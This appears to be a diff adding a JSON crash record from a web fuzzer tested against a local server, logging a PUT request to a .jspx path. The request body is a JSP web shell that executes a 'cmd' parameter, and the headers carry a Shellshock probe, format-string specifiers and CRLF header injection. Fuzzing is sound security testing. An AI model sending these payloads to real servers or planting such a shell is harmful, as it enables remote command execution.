@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:42:06.014196",
+  "crash_type": "server_crash",
+  "payload": "PUT /test.jspx?\nHeaders: {'User-Agent': '() { :; }; echo vulnerable', 'Accept-Encoding': '%n%n%n%n%n%n%n%n%n%n', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Accept-Language': '9223372036854775807', 'Transfer-Encoding': '%0d%0aSet-Cookie: evil=true', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "f3cf4fa78d2c7ccf",
+  "request_method": "PUT",
+  "request_path": "/test.jspx?",
+  "request_headers": {
+    "User-Agent": "() { :; }; echo vulnerable",
+    "Accept-Encoding": "%n%n%n%n%n%n%n%n%n%n",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Accept-Language": "9223372036854775807",
+    "Transfer-Encoding": "%0d%0aSet-Cookie: evil=true",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 24
+}
